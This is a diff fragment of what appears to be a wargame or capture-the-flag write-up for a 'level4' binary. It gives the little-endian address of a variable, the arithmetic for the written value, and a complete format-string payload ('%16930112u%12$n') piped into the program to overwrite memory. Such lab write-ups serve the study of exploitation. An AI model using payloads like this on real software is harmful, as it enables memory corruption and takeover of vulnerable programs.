@@ -38,6 +38,8 @@ $1 = 16930116
 (gdb)
 
 the address of m is 0x8049810 =litle endian>\x10\x98\x04\x08
+we need to sub 4 bytes of the address from 16930116
+
 the final payload:
 
 (python -c "print('\x10\x98\x04\x08'+ '%16930112u%12\$n')"; cat) | ./level4
